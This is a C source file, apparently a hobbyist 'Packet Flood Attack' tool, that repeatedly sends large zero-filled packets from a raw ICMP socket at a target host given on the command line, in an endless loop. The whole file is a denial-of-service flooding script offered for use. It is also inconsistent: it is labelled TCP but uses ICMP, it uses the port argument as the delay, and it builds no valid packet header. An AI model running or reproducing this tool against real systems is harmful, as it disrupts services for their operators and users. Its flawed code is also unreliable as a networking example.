#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in server_addr;
    int server_socket;
    struct hostent *server;
    int packet_size;
    char *packet;

    if(argc != 4)
    {
        printf("Packet Flood Attack via TCP\n\nScript by : @Rhythm113 \n\nUsage: %s <target> <port> <delay (ms)>\n", argv[0]);
        exit(1);
    }

    server = gethostbyname(argv[1]);
    if(server == NULL)
    {
        printf("Could not find the host %s\n", argv[1]);
        exit(1);
    }

    server_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(server_socket == -1)
    {
        printf("Could not create the socket\n");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(atoi(argv[2]));
    server_addr.sin_addr = *((struct in_addr *)server->h_addr);

    packet_size = 60 * 1024;
    packet = (char *)malloc(packet_size);
    if(packet == NULL)
    {
        printf("Could not allocate memory for the packet\n");
        exit(1);
    }

    memset(packet, 0, packet_size);

    while(1)
    {
        usleep(atoi(argv[2]));
        if(sendto(server_socket, packet, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
        {
            printf("Error in sending packet\n");
            //break;
        }
        printf("Sent 1 packets to %s:%s\n",argv[1], argv[2]);

    }

    free(packet);
    close(server_socket);
    return 0;
}